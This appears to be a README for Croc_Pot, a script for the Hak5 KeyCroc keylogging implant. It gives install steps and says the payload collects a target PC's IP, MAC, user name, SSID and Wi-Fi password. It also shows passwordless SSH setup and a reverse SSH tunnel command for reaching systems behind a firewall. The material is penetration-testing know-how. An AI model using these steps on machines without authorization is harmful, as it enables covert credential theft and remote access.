# Croc_Pot

## INSTALLATION :
* Two file to this script
  - Will need to enter arming mode on your keycroc to install files.
  - First file is called Croc_Pot.sh Place this in the KeyCroc tools folder.
  - Second file is called Croc_Pot_Payload.txt Place this in the KeyCroc payload folder.
  - Edited the Croc_Pot_Payload.txt file for your keycroc passwd. default is (hak5croc)
  - Ensure your KeyCroc is connected (wifi) to the same local network as the target pc

## STARTING CROC_POT :
  - First way to start Croc_Pot.sh is ssh into your keycroc and type **/root/udisk/tools/Croc_Pot.sh**.
  - Second way to start Croc_Pot.sh is type in anywhere **crocpot** this will start Croc_Pot.sh script automatically.
  - It is recommended to start Croc_Pot.sh script with typing in **crocpot** as this payload will collect some data off the target pc. Some info that it will collect will be Target ip,mac,pc name,user name,SSID and passwd, This info will be used in the Croc_Pot.sh script.

## SSH MENU :
### CREATE PUBLIC AND PRIVATE KEY
* Perform SSH Login Without Password Using ssh-keygen & ssh-copy-id
* Step 1: Create public and private keys using ssh-key-gen on local-host
  - jsmith@local-host$ **Note: You are on local-host here**
  - jsmith@local-host$ **ssh-keygen**
  - [Press enter key]
 * Step 2: Copy the public key to remote-host using ssh-copy-id
   - jsmith@local-host$ **ssh-copy-id -i ~/.ssh/id_rsa.pub remote-host-ip**
   - jsmith@remote-host's password:
 * Step 3: Login to remote-host without entering the password
   -jsmith@local-host$ **ssh remote-host-ip**
 * The above 3 simple steps should get the job done in most cases.
 ### Setup Reverse SSH Tunnel
   - Reverse SSH is a technique that can be used to access systems (that are behind a firewall) from the outside world.
   - Here is the command for remote server side
   - **ssh -fN -R 7000:localhost:22 username@your-Machine-ipaddress**
   - Now do an ssh connection request from your machine to your own machine at port 7000:
   - **ssh username@localhost -p 7000**
   - Here, though it may seem like you are doing ssh on localhost but your request would be forwarded to remote host. So, you should use your account ? username ? on remote server and when prompted for password, enter the corresponding password.
